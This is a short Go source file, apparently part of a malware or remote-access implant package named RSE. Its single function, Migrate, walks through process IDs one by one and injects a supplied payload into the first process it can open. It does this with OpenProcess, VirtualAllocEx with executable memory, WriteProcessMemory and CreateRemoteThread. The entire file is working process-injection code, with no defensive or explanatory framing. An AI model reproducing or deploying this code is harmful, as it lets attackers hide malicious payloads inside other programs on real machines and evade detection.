package RSE

func Migrate(Addr uintptr, Size int)  {
  for i := 200; i < 99999; i++ {

    var F int = 0
    Proc, _, _ := OpenProcess.Call(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, uintptr(F), uintptr(i))

    R_Addr, _, _ := VirtualAllocEx.Call(Proc, uintptr(F), uintptr(Size), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)

    WriteProcessMemory.Call(Proc, R_Addr, Addr, uintptr(Size), uintptr(F))

    Status, _, _ := CreateRemoteThread.Call(Proc, uintptr(F), 0, R_Addr, uintptr(F), 0, uintptr(F))
    if Status != 0 {
      break
    }
  }
}
